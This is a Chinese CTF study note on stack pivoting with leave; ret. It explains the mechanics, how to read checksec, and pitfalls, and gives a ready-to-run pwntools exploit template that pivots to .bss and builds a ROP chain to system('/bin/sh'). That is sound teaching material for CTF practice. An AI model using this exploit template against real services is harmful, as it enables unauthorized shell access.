---
title: 栈迁移（leave; ret）与栈劫持
category: pwn
tags: [栈迁移, leave ret, 栈劫持, ROP空间不足, bss]
signals: [溢出长度只够覆盖 rbp + 返回地址, "栈空间不够放完整 ROP", 二进制里有 leave ret gadget, 存在可写 .bss 或堆地址泄露, 反编译出现 read(0, buf, n) 后立即 ret]
difficulty: medium
source: "CTF-Wiki 基本 ROP / ir0nstone Stack Pivoting"
tools: [pwntools, gdb, pwndbg, ROPgadget]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- `read(0, buf, 0x10)` 而 `buf` 是 `0x8` 字节——只能覆盖到 `saved rbp` 和 `ret`，放不下 gadget 链。
- 反汇编函数尾部是经典的 `leave; ret`，且 `checksec` 显示 `No Canary`（否则 rbp 与 canary 顺序要重排）。
- 题目有一块可写的 `.bss`（`elf.bss()`），或者能拿到堆地址。
- 题目先 `read` 一次把数据写进 `.bss`，再 `read` 触发溢出——非常经典的两段式。
- 反编译里出现 `read(0, &global_buf, 0x400)` 这类大缓冲区。

## 二、原理

`leave` 等价于 `mov rsp, rbp; pop rbp`，`ret` 是 `pop rip`。所以：

```text
调用前:  rbp = old_rbp,  [rsp] = ret_addr
leave:   rsp = rbp            ; 栈指针跳到 saved rbp 的位置
         pop rbp              ; rbp = 我们伪造的值（可控）
ret:     rip = [rsp]          ; 跳到下一个地址
```

如果我们把 `saved rbp` 覆盖为 `fake_frame_addr`，同时把 `ret` 覆盖为 `leave; ret`，那么：

1. 第一次 `leave; ret`：`rbp = fake_frame_addr`，`rsp` 也随之跳过去。
2. `ret` 再次执行 `leave; ret`（因为我们把返回地址设成了 leave;ret）会把 `rsp = rbp = fake_frame_addr`，然后弹出 `[fake_frame]` 作为新 `rbp`、`[fake_frame+8]` 作为新 `rip`。

实际执行时链条为：

```text
payload = padding + p64(fake_frame_addr) + p64(leave_ret)
# fake_frame_addr 处布局：
#   +0x00: 任意（成为新 rbp，一般填 fake_frame_addr+0x10 或 0）
#   +0x08: 第一条 gadget / 函数地址
#   +0x10: 参数 / 后续链
```

要**走两次 leave**：如果 `read` 后紧跟的返回路径只经过一次 `leave;ret`，那么 `fake_frame_addr` 处 `+0` 就是新 rbp，`+8` 就是真正的 gadget 链起点 —— 等价于「栈整体搬到了 `fake_frame`」。这就是栈迁移。

## 三、checksec 判读与利用思路

```text
RELRO: Partial  Canary: No  NX: enabled  PIE: disabled
```

1. `PIE disabled` ⇒ 可写段地址固定（`elf.bss()`），最省事。
2. `PIE enabled` ⇒ 先用格式化字符串/堆泄露拿到可写段地址，再迁移。
3. `Canary found` ⇒ 覆盖 `saved rbp` 前要先泄露 canary（顺序：`buf → canary → saved rbp → ret`）。
4. 找 `leave; ret`：

```bash
ROPgadget --binary ./pwn --only "leave|ret" | head
# 或 pwntools：ROP(elf).find_gadget(["leave", "ret"])
```

5. 目标可写区选择优先级：
   - `.bss`（`elf.bss(0x400)`，避开 GOT 与已有全局变量）
   - 堆（需 heap 地址泄露）
   - 栈上原有可控区域（`%n` 写过去）
6. 迁移后第一件事通常是 `read(0, bss+0x200, 0x400)`，把完整 ROP 链灌进去，再 `leave; ret` 到 `bss+0x200`。

## 四、可直接运行的 exp 脚本

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./pwn")
context.log_level = "info"

def start():
    return remote(args.HOST or "TARGET", int(args.PORT or 1337)) if args.REMOTE \
           else process()

PADDING   = b"A" * 0x40                      # 到 saved rbp 的偏移（占位）
LEAVE_RET = ROP(elf).find_gadget(["leave", "ret"]).address
POP_RDI   = ROP(elf).find_gadget(["pop rdi", "ret"]).address
RET       = ROP(elf).find_gadget(["ret"]).address
BSS_MAIN  = elf.bss(0x400)                   # 主 ROP 链落点
BSS_FAKE  = elf.bss(0x800)                   # 若需二次迁移的伪帧

# ---------- 两段式：迁移到 bss，再 read 完整链 ----------
def exp_two_stage(p):
    # 第一段：把 rbp 指向 BSS_MAIN，返回地址改为 leave;ret
    payload  = PADDING
    payload += p64(BSS_MAIN)                 # saved rbp = 新栈顶
    payload += p64(LEAVE_RET)                # 触发第二次 leave;ret
    p.send(payload)

    # 第二段：此时 rsp = BSS_MAIN，程序继续读入并存活
    # 先让程序调到 read(0, BSS_MAIN, 0x400) 再 leave;ret 回来
    # （若题目第二段不 read，则直接跳到 bss 已有内容处执行）
    stage2  = p64(POP_RDI) + p64(0)
    stage2 += p64(ROP(elf).find_gadget(["pop rsi", "pop r15", "ret"]).address)
    stage2 += p64(BSS_MAIN + 0x10) + p64(0)
    stage2 += p64(ROP(elf).find_gadget(["pop rdx", "ret"]).address) + p64(0x400)
    stage2 += p64(elf.plt["read"])
    stage2 += p64(LEAVE_RET)
    p.send(stage2)

# ---------- 一次性：bss 上先放好完整链 ----------
def exp_single(p, rop_chain):
    """rop_chain 是 bytes；要求程序在溢出前已 read 过 bss（大缓冲）"""
    payload  = PADDING
    payload += p64(BSS_MAIN)     # 新 rbp 指向链
    payload += p64(LEAVE_RET)    # 触发
    p.send(payload)
    # bss 里的链第一个 8 字节会成为 rbp，所以 rop_chain 前加 8 字节 filler
    p.send(p64(0) + rop_chain)

# ---------- 主流程：bss 写 /bin/sh → system ----------
def exp():
    p = start()
    libc = ELF("./libc.so.6", checksec=False)
    libc.address = int(args.BASE or "0", 16)      # 占位：由泄露步骤填入

    chain  = b"\x00" * 8                          # 占位成 rbp
    chain += p64(POP_RDI) + p64(BSS_MAIN + 0x300)
    chain += p64(RET)                             # 栈对齐
    chain += p64(libc.sym["system"])
    chain += b"/bin/sh\x00"
    exp_single(p, chain)
    p.interactive()

# ---------- 变体：pop rsp 迁移（有 pop rsp 时更干脆） ----------
def exp_pop_rsp(p, target):
    POP_RSP = ROP(elf).find_gadget(["pop rsp", "ret"]).address
    payload  = PADDING
    payload += p64(POP_RSP) + p64(target)         # rsp := target
    payload += p64(RET)                           # 跳过去执行
    p.send(payload)

if __name__ == "__main__":
    exp()
```

调试确认迁移是否生效：

```bash
# 在 vuln 的 leave 前下断，看 rbp/rsp 是否跳到 bss
gdb -q ./pwn -ex 'b *vuln+0x50' -ex r -ex 'x/8gx $rbp' -ex q
```

## 五、常见坑 / 变体

- **新栈位置第一个 8 字节被当成 rbp**：迁移后 `[fake]` 会被 `pop rbp` 吃掉，链必须从 `fake+8` 开始，前面塞 8 字节 filler。
- **`.bss` 被 `read` 长度卡死**：两段式第二段 `read` 长度要足够放下整条链（≥ 0x100）。
- **canary 顺序搞错**：有 canary 时 `saved rbp` 在 canary 之后，padding 要重算。
- **栈对齐**：迁移后 `system` 崩 `movaps`，链里加一个 `ret` 即可。
- **迁移目标写坏 GOT**：`.bss(0x400)` 是保守起点；若题目 `.bss` 很小，用 `elf.bss()` + 偏移找干净区。
- **无 `leave;ret` gadget**：用 `pop rbp; ret` + `pop rsp; ret` 组合，两次搬迁效果相同。

## 六、参考来源

- [CTF-Wiki: 基本 ROP（栈迁移）](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/)
- [CTF-Wiki: 花式栈溢出技巧](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/fancy-rop/)
- [ir0nstone: Stack Pivoting](https://ir0nstone.gitbook.io/notes/binexp/stack/stack-pivoting)
- [ir0nstone: leave; ret 迁移实例](https://ir0nstone.gitbook.io/notes/binexp/stack/stack-pivoting/exploitation/leave)
- [ir0nstone: 调用约定（栈布局）](https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/calling-conventions)
- [HackTricks: ROP](https://book.hacktricks.wiki/en/binary-exploitation/rop-return-oriented-programing/index.html)
